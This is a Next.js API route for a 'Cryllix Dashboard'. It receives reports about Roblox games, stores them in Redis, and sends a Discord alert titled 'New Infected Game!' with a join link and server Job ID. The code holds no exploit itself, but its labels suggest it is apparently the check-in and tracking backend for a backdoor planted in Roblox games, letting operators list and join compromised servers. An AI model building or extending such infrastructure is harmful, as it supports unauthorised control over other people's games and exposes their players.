import { NextRequest, NextResponse } from 'next/server';
import { upsertGame, getGame } from '@/lib/redis';
import { z } from 'zod';
import { sendDiscordWebhook, getThumbnail } from '@/lib/roblox';

export const runtime = 'nodejs';

// Schema for validation
const webhookSchema = z.object({
    gameId: z.string().min(1, "Game ID is required"),
    name: z.string().min(1, "Name is required"),
    playerCount: z.number().int().nonnegative().default(0),
    description: z.string().optional().nullable(),
    imageUrl: z.string().url().optional().nullable(),
    jobId: z.string().optional().nullable(), // Added JobId
});

// POST /api/webhooks/games
export async function POST(request: NextRequest) {
    try {
        const body = await request.json();

        // Validate input
        const result = webhookSchema.safeParse(body);

        if (!result.success) {
            return NextResponse.json(
                { success: false, error: 'Validation failed', details: result.error.format() },
                { status: 400 }
            );
        }

        const { gameId, name, playerCount, description, imageUrl, jobId } = result.data;

        // Ensure we have a valid thumbnail URL
        let finalImageUrl = imageUrl;
        if (!finalImageUrl) {
            try {
                const thumbnailResponse = await fetch(
                    `https://thumbnails.roblox.com/v1/places/gameicons?placeIds=${gameId}&size=512x512&format=Png&isCircular=false`
                );

                if (thumbnailResponse.ok) {
                    const thumbnailData = await thumbnailResponse.json();
                    if (thumbnailData?.data?.[0]?.imageUrl) {
                        finalImageUrl = thumbnailData.data[0].imageUrl;
                    }
                }
            } catch (err) {
                console.error('[Webhook] Failed to fetch thumbnail:', err);
            }
        }

        // Check if game exists to determine if we need to notify
        const existingGame = await getGame(gameId);
        const isNewGame = !existingGame;

        // Upsert the game in Redis
        const game = await upsertGame({
            gameId,
            name,
            playerCount,
            lastPing: Date.now(),
            description: description || null,
            imageUrl: finalImageUrl || null,
        });

        console.log(`[Webhook] Updated game: ${name} (${gameId}) - Players: ${playerCount} - JobId: ${jobId || 'N/A'}`);

        // Send Discord Notification if new game
        if (isNewGame) {
            const thumbnail = imageUrl || await getThumbnail(gameId);

            await sendDiscordWebhook({
                title: "🚨 New Infected Game!",
                description: `**${name}** has been logged.`,
                url: `https://www.roblox.com/games/${gameId}`,
                color: 0xFF0000, // Red
                fields: [
                    { name: "Players", value: playerCount.toString(), inline: true },
                    { name: "Game ID", value: gameId, inline: true },
                    { name: "Job ID", value: jobId || "N/A", inline: false },
                    { name: "Join Link", value: `[Click to Join](https://www.roblox.com/games/${gameId})`, inline: false }
                ],
                thumbnail: { url: thumbnail },
                footer: { text: "Cryllix Dashboard • " + new Date().toLocaleTimeString() }
            });
        }

        // Return 200 OK with minimal response, typical for webhooks
        return NextResponse.json({
            success: true,
            message: 'Webhook received'
        });

    } catch (error) {
        console.error('[Webhook] Error processing game webhook:', error);
        return NextResponse.json(
            { success: false, error: 'Internal server error' },
            { status: 500 }
        );
    }
}
